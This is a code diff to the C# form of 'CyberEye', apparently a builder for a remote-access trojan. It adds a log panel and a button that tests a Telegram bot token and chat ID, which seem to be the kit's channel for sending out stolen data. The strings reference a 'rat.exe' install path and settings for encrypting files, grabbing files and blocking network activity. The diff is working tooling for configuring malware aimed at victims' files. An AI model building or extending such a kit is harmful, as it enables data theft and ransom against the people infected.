@@ -8,8 +8,11 @@
 
 using System;
 using System.Data;
+using System.Drawing;
 using System.IO;
 using System.Linq;
+using System.Net;
+using System.Net.Http;
 using System.Windows.Forms;
 
 namespace CyberEye.Client.Builder
@@ -49,11 +52,39 @@ namespace CyberEye.Client.Builder
             ".pdf", ".txt", ".rtf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
             ".sql", ".php", ".py", ".html", ".xml", ".json", ".csv"
         };
+        Bitmap iconError = SystemIcons.Error.ToBitmap();
+        Bitmap iconWarning = SystemIcons.Warning.ToBitmap();
+        Bitmap iconInfo = SystemIcons.Information.ToBitmap();
+        Bitmap iconSuccess = SystemIcons.Shield.ToBitmap();
         public frmBuild()
         {
             InitializeComponent();
-        }
+            /*
+            var imageList = new ImageList();
+            imageList.ImageSize = new Size(16, 16);
 
+            imageList.Images.Add("error", System.Drawing.SystemIcons.Error.ToBitmap());
+            imageList.Images.Add("warning", System.Drawing.SystemIcons.Warning.ToBitmap());
+            imageList.Images.Add("info", System.Drawing.SystemIcons.Information.ToBitmap());
+            imageList.Images.Add("success", System.Drawing.SystemIcons.Shield.ToBitmap());
+
+            listViewLog.SmallImageList = imageList;
+
+            listViewLog.View = View.Details;
+            listViewLog.Columns.Add(" ", 20);
+            listViewLog.Columns.Add("Time", 120);
+            listViewLog.Columns.Add("Message", 400);
+            */
+        }
+        /*private void AddLog(string typeKey, string message)
+        {
+            var item = new ListViewItem("");
+            item.ImageKey = typeKey; // "error", "warning", "info", "success"
+            item.SubItems.Add(DateTime.Now.ToString("HH:mm:ss"));
+            item.SubItems.Add(message);
+            listViewLog.Items.Add(item);
+        }
+        */
         private void textBox2_TextChanged(object sender, EventArgs e)
         {
 
@@ -104,6 +135,40 @@ namespace CyberEye.Client.Builder
             RefreshListBox();
             RefreshGrabListBox();
             RefreshProcessListBox();
+
+            dataGridViewLog.RowTemplate.Height = 20;
+            dataGridViewLog.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
+            dataGridViewLog.DefaultCellStyle.WrapMode = DataGridViewTriState.True;
+            dataGridViewLog.AllowUserToAddRows = false;
+            dataGridViewLog.RowHeadersVisible = false;
+            dataGridViewLog.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
+
+            DataGridViewImageColumn iconCol = new DataGridViewImageColumn();
+            iconCol.HeaderText = "";
+            iconCol.Width = 30;
+            iconCol.ImageLayout = DataGridViewImageCellLayout.Zoom;
+            dataGridViewLog.Columns.Add(iconCol);
+
+            dataGridViewLog.Columns.Add("Time", "Time");
+            dataGridViewLog.Columns["Time"].Width = 100;
+
+            dataGridViewLog.Columns.Add("Message", "Message");
+            dataGridViewLog.Columns["Message"].Width = 500;
+            AddLog(iconWarning, "[WARNING] Functions \"Encryption File Types\", \"Grab File Types\", and \"Block Network Activity ProcessList\" are not working.\r\nDefault values embedded in the .exe will be used instead.\r\n[ALSO] Please use double backslashes (\\\\) in file (payload install path), e.g.:\r\n✅ C:\\\\Users\\\\CyberEye\\\\rat.exe instead of ❌ C:\\Users\\CyberEye\\rat.exe");
+            /*int lastRowIndex = dataGridViewLog.Rows.Count - 1;
+            if (lastRowIndex >= 0)
+            {
+                dataGridViewLog.FirstDisplayedScrollingRowIndex = lastRowIndex;
+            }
+            */
+            dataGridViewLog.ClearSelection();
+            dataGridViewLog.ReadOnly = true;
+            //AddLog("warning", "[WARNING] Functions \"Encryption File Types\", \"Grab File Types\", and \"Block Network Activity ProcessList\" are not working.\r\nDefault values embedded in the .exe will be used instead.\r\n");
+        }
+        private void AddLog(Bitmap icon, string message)
+        {
+            string time = DateTime.Now.ToString("HH:mm:ss");
+            dataGridViewLog.Rows.Add(icon, time, message);
         }
 
         private void button5_Click(object sender, EventArgs e)
@@ -283,6 +348,64 @@ namespace CyberEye.Client.Builder
 
                 MessageBox.Show("Build completed successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
 
+            }
+        }
+
+        private void pictureBox1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void TestMsgRequestBtn_Click(object sender, EventArgs e)
+        {
+            if (string.IsNullOrWhiteSpace(textBox1.Text) || string.IsNullOrWhiteSpace(textBox2.Text) ||
+    textBox1.Text == "TELEGRAM_TOKEN_HERE" || textBox2.Text == "TELEGRAM_CHAT_ID_HERE")
+            {
+                AddLog(iconError, "❌ Please fill in all fields correctly!");
+                int lastRowIndex = dataGridViewLog.Rows.Count - 1;
+                if (lastRowIndex >= 0)
+                {
+                    dataGridViewLog.FirstDisplayedScrollingRowIndex = lastRowIndex;
+                }
+            }
+            else
+            {
+                try
+                {
+                    using (WebClient client = new WebClient())
+                    {
+                        string url = "https://api.telegram.org/bot" + textBox1.Text +
+                                     "/sendMessage?chat_id=" + textBox2.Text +
+                                     "&text=" + Uri.EscapeDataString("✅ Connection Successful. Token and Chat ID are valid."); ;
+
+                        client.DownloadString(url);
+                        AddLog(iconInfo, "✅ Connection Successful. Token and Chat ID are valid.");
+                        int lastRowIndex = dataGridViewLog.Rows.Count - 1;
+                        if (lastRowIndex >= 0)
+                        {
+                            dataGridViewLog.FirstDisplayedScrollingRowIndex = lastRowIndex;
+                        }
+                    }
+                }
+                catch (WebException ex)
+                {
+                    AddLog(iconError, "❌ Failed to send message. Check your token and chat ID.");
+                    AddLog(iconError, "Error: " + ex.Message);
+                    int lastRowIndex = dataGridViewLog.Rows.Count - 1;
+                    if (lastRowIndex >= 0)
+                    {
+                        dataGridViewLog.FirstDisplayedScrollingRowIndex = lastRowIndex;
+                    }
+                }
+                catch (Exception ex)
+                {
+                    AddLog(iconError, "❌ Unexpected error: " + ex.Message);
+                    int lastRowIndex = dataGridViewLog.Rows.Count - 1;
+                    if (lastRowIndex >= 0)
+                    {
+                        dataGridViewLog.FirstDisplayedScrollingRowIndex = lastRowIndex;
+                    }
+                }
             }
         }
     }
